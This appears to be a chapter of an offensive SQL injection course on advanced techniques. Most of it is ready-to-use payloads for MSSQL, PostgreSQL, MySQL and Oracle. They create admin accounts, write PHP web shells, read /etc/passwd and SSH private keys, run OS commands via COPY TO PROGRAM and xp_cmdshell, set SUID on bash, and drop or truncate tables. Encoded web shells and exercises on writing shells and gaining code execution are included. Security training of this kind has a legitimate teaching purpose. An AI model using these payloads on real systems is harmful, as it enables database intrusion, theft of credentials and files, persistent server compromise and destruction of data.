# 10 - Advanced Techniques

## Stacked Queries

Execute multiple SQL statements in one request.

### Supported Databases

| Database       | Support    | Syntax                             |
| -------------- | ---------- | ---------------------------------- |
| **MSSQL**      | ✅ Full    | `; SELECT ...`                     |
| **PostgreSQL** | ✅ Full    | `; SELECT ...`                     |
| **MySQL**      | ⚠️ Via API | `; SELECT ...` (depends on driver) |
| **Oracle**     | ❌ No      | No stacked queries                 |
| **SQLite**     | ❌ No      | No stacked queries                 |

### MSSQL Stacked Queries

```sql
-- Basic stacked query
'; SELECT @@version; SELECT user;--

-- Create user
'; CREATE USER attacker WITH PASSWORD 'password123';--

-- Add to admin role
'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--

-- Drop table (destructive)
'; DROP TABLE users;--
```

### PostgreSQL Stacked Queries

```sql
-- Basic stacked query
'; SELECT version(); SELECT current_user;--

-- Create superuser
'; CREATE USER attacker WITH SUPERUSER PASSWORD 'password123';--

-- Execute OS command
'; COPY (SELECT '') TO PROGRAM 'id';--
```

### MySQL Stacked Queries (Limited)

MySQL generally does not support stacked queries via web interfaces (mysqli, PDO).
But works with certain drivers and configurations.

```sql
-- If supported by driver
'; SELECT sleep(5); SELECT 'done';--
```

## File System Operations

### Read Files from Server

#### MySQL

```sql
-- Read file (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd')
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')

-- Union extraction
UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--

-- Into outfile (requires write permissions)
SELECT 'malicious content' INTO OUTFILE '/var/www/shell.php'
```

#### PostgreSQL

```sql
-- Read file (superuser only)
SELECT pg_read_file('postgresql.conf', 0, 1000)

-- Large object import
SELECT lo_import('/etc/passwd')
SELECT lo_get(12345)  -- Get content from OID

-- Copy to read
COPY (SELECT '') FROM '/etc/passwd'
```

#### MSSQL

```sql
-- Read file via OPENROWSET
SELECT * FROM OPENROWSET(BULK 'C:\\file.txt', SINGLE_CLOB) AS x

-- Via BCP (command line integration)
'; EXEC xp_cmdshell 'type C:\\file.txt';--
```

#### Oracle

```sql
-- Read file via UTL_FILE
SELECT UTL_FILE.FGET_LINE(UTL_FILE.FOPEN('/etc','passwd','R'),1) FROM DUAL

-- Via external tables
CREATE DIRECTORY MYDIR AS '/etc';
SELECT * FROM TABLE(utl_file.dir_list('MYDIR'));
```

### Write Files to Server

#### MySQL

```sql
-- Write web shell
SELECT '<?php system($_GET[1]); ?>' INTO OUTFILE '/var/www/html/shell.php'

-- Append to existing file
SELECT 'content' INTO OUTFILE '/tmp/file.txt' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY ''

-- Conditional write
'; SELECT IF(1=1, (SELECT 'shell' INTO OUTFILE '/var/www/shell.php'), 0);--
```

**Requirements**:

- `FILE` privilege
- MySQL server write permissions to target directory
- `secure_file_priv` does not restrict target directory

#### PostgreSQL

```sql
-- Write via COPY
COPY (SELECT 'shell content') TO '/var/www/shell.php'

-- Via large objects
SELECT lo_create(12345)
SELECT lo_put(12345, 0, 'shell content')
SELECT lo_export(12345, '/var/www/shell.php')
```

#### MSSQL

```sql
-- Via OLE Automation (if enabled)
DECLARE @FS INT, @FILE INT
EXEC sp_OACreate 'Scripting.FileSystemObject', @FS OUT
EXEC sp_OAMethod @FS, 'OpenTextFile', @FILE OUT, 'C:\\shell.php', 2, True
EXEC sp_OAMethod @FILE, 'WriteLine', NULL, '<?php system($_GET[1]); ?>'
```

## Privilege Escalation

### MySQL

```sql
-- Check current privileges
SHOW GRANTS
SELECT user, host FROM mysql.user

-- Escalation attempts (if FILE privilege)
SELECT LOAD_FILE('/root/.ssh/id_rsa')

-- Read application config
SELECT LOAD_FILE('/var/www/html/config.php')
```

### PostgreSQL

```sql
-- Check role
SELECT current_user, session_user

-- List roles with superuser
SELECT rolname FROM pg_roles WHERE rolsuper=true

-- Attempt privilege escalation via COPY TO PROGRAM
'; COPY (SELECT '') TO PROGRAM 'chmod u+s /bin/bash';--
```

### MSSQL

```sql
-- Check current user
SELECT SYSTEM_USER, USER_NAME()

-- Check server roles
SELECT IS_SRVROLEMEMBER('sysadmin')

-- List sysadmins
SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1

-- Escalation via xp_cmdshell (if can enable)
'; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;--
```

## Database-to-Database Pivoting

### MySQL

```sql
-- Access other databases
SELECT * FROM mysql.user
SELECT * FROM information_schema.schemata

-- Cross-database query
SELECT * FROM other_db.users
UNION SELECT * FROM mysql.user
```

### MSSQL

```sql
-- List linked servers
SELECT srvname FROM sysservers

-- Query linked server
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@version')

-- Execute on linked server (if configured)
'; EXEC ('SELECT @@version') AT [LINKED_SERVER];--
```

### PostgreSQL

```sql
-- List databases
SELECT datname FROM pg_database WHERE datistemplate=false

-- Access other database (requires privileges)
\c other_database
SELECT * FROM users

-- Via dblink extension
SELECT * FROM dblink('host=localhost dbname=other', 'SELECT * FROM users')
AS t(id int, username text, password text)
```

## Session Manipulation

### Cookie/Token Forgery

```sql
-- Generate valid session token (if know algorithm)
SELECT MD5(CONCAT(user_id,':',secret_key,':',UNIX_TIMESTAMP()))
FROM users WHERE username='admin'

-- Predictable session IDs
SELECT * FROM sessions WHERE session_id LIKE 'sess_%'
ORDER BY created_at DESC LIMIT 1
```

## Denial of Service via SQLi

### Resource Exhaustion

```sql
-- MySQL: Heavy query
SELECT BENCHMARK(1000000000,SHA1('test'))

-- PostgreSQL: Cartesian product
SELECT * FROM pg_class, pg_class t2, pg_class t3, pg_class t4

-- MSSQL: Infinite loop (if can create procedure)
'; WHILE 1=1 BEGIN SELECT 1 END;--
```

### Table Locking

```sql
-- Lock tables
LOCK TABLES users WRITE, orders WRITE

-- Long transaction
BEGIN; SELECT * FROM users FOR UPDATE; -- Never commit
```

### Data Destruction

```sql
-- Delete all data
'; DELETE FROM users;--

-- Truncate (faster, no logs)
'; TRUNCATE TABLE users;--

-- Drop database (requires privileges)
'; DROP database production;--
```

## Encoding and Evasion for Advanced Payloads

### Hex Encoding

```sql
-- Convert hex to string and execute
SELECT UNHEX('3C3F70687020706870696E666F28293B3F3E') -- <?php phpinfo();?>

-- MSSQL
SELECT CONVERT(VARCHAR(MAX), 0x3C3F706870...)
```

### Base64 Encoding

```sql
-- MySQL 8.0+
SELECT FROM_BASE64('PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg==')

-- PostgreSQL
SELECT decode('PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg==', 'base64')
```

## Practice Exercises

### Exercise 1: File Read

Given MySQL SQLi with FILE privilege, read `/etc/passwd`.

### Exercise 2: Web Shell Write

Write PHP web shell to `/var/www/html/shell.php` using INTO OUTFILE.

### Exercise 3: Stacked query

MSSQL environment. Use stacked query to enable xp_cmdshell and execute `whoami`.

### Exercise 4: PostgreSQL RCE

PostgreSQL with superuser access. Use `COPY TO PROGRAM` to execute system command.

### Exercise 5: Privilege Check

Blind SQL injection scenario. Determine current user privileges without error messages.

## Key Takeaways

1. **Stacked queries** = multiple statements, limited database support
2. **File operations** = read sensitive files, write web shells
3. **Privilege escalation** = check and attempt privilege upgrades
4. **Resource exhaustion** = DoS via heavy queries
5. **Pivoting** = access other databases and systems

## Next Step

Continue to [11 - OS Command Execution](11-OS-Command-Execution.md) for full system compromise.
